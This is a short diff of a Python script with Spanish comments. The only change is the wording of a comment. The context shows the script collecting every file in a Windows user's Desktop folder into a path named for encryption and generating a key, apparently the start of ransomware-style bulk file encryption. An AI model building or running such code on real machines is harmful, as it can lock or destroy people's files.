@@ -36,7 +36,7 @@ def get_all_files_in_directory(dir_path):
     return files_list
 
 if __name__ == '__main__':
-    path_to_encrypt = 'C:\\Users\\[nombre de usuario]\\Desktop'  # Reemplaza [nombre de usuario] con tu nombre de usuario
+    path_to_encrypt = 'C:\\Users\\[nombre de usuario]\\Desktop'  # Reemplaza [nombre de usuario] con su nombre de usuario
     all_files = get_all_files_in_directory(path_to_encrypt)
 
     key = generar_key()
